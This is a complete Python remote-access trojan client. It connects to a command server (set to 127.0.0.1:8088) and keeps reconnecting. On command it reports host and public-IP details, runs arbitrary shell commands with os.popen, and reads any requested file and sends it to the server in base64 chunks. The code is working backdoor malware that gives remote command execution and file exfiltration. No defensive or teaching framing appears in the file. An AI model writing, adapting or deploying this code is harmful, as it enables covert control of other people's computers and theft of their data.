import platform
import requests
import base64
import socket
import json
import time
import re
import os

def multipart_send(server, content, isfile):
    content = str(content)
    cut_data = list()
    if len(content) <= 1456:
        cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content.encode('utf-8')).decode('utf-8'), 'key': 'EOF'}).encode('utf-8'))
    else:
        while len(content) > 1456:
            cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content[:1456].encode('utf-8')).decode('utf-8'), 'key': 'NXT'}).encode('utf-8'))
            content = content[1456:]
        cut_data.append(json.dumps({'type': 'data', 'content': base64.b64encode(content.encode('utf-8')).decode('utf-8'), 'key': 'EOF'}).encode('utf-8'))
    if isfile:
        server.send(json.dumps({'type': 'len', 'content': len(cut_data), 'key': 'NXT'}).encode('utf-8'))
    for data in cut_data:
        print(data)
        server.send(data)
        time.sleep(0.001)
    cut_data.clear()
    content = ''


def get_ip():
    try:
        addr_ip = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
        ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)[0]
        return ip
    except:
        return '0:0:0:0'


def get_info(server):
    multipart_send(server, json.dumps({
        'ip': get_ip(),
        'node': platform.node(),
        'platform': platform.platform(),
        'version': platform.version(),
        'processor': platform.processor()
    }).encode('utf-8'), False)


def exec_shell(server, command):
    console_return = ''.join(os.popen(command).readlines())
    multipart_send(server, console_return.encode('utf-8'), False)

def fetch_file(server, filepath):
    file_buf = bytearray(os.path.getsize(filepath))
    with open(filepath, 'rb') as file:
        file.readinto(file_buf)
    buf_str = str(file_buf.hex().encode('utf-8'))
    multipart_send(server, buf_str, True)
    buf_str = ''


def tcpClient(client):
    while True:
        try:
            recv_data = client.recv(2048).decode('utf-8')
            json_data = json.loads(recv_data)
            match json_data['type']:
                case 'heartbeat':
                    continue
                case 'info':
                    get_info(client)
                case 'shell':
                    exec_shell(client, json_data['content'])
                case 'fetch':
                    fetch_file(client, json_data['content'])
        except:
            client.close()
            connect()
            return


def connect():
    host = '127.0.0.1'
    port = 8088
    try:
        client = socket.socket()
        client.connect((host, port))
        print('server connected')
        client.send(json.dumps({
            'type': 'client',
            'content': platform.platform() + ' - ' + get_ip()
        }).encode())
        tcpClient(client)
    except socket.error as e:
        print(e.strerror)
        time.sleep(1)
        connect()


if __name__ == '__main__':
    connect()